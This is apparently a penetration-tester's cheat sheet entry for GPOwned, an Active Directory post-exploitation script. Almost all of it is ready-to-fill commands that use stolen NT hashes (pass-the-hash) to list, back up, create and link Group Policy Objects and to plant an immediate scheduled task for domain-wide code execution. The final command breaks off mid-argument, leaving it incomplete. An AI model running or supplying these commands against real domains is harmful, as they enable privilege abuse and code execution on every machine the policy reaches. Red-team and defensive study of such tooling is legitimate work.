# GPOwned

% Active directory, gpo 
#plateform/linux #target/remote #cat/POSTEXPLOIT/GPO  


## GPOwned - desc
```
The script uses impacket and ldap3 to update the GPOs. It implements enough primitives that can be combined (just need to perform minor changes in the code) to achieve different ways of code execution (DLL hijacking, COM junctions, shortcut poisoning, etc.)
```

## GPOwned - repo
```
https://github.com/X-C3LL/GPOwned
```

## GPOwned - doc
```
```

## GPOwned - install
```
```

## list GPO
```
GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -listgpo -gpcmachine
```

## backup GPO
```
GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine  -backup <backup_name> -name "{<gpo_cn>}"
```

## create GPO
```
GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -creategpo -name "<gpo_name|jubeaz>" -comment "<gpo_comment|pwn>"
```

## link GPO to a site
```
GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -linkgpotosite -name "<gpo_name|jubeaz>" -sitename "<site_name|Default-First-Site-Name>"
```

## immediate tasks
```bash
python3 GPOwned.py -u <user>  -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -gpoimmtask -name '{<gpo_guid>}' -author '<gpo_name|jubeaz>' -taskname '<task_name|jubeaz>C' -taskdescription '<gpo_desc|jubeaz>' -dstpath 'c:\windows\system32
```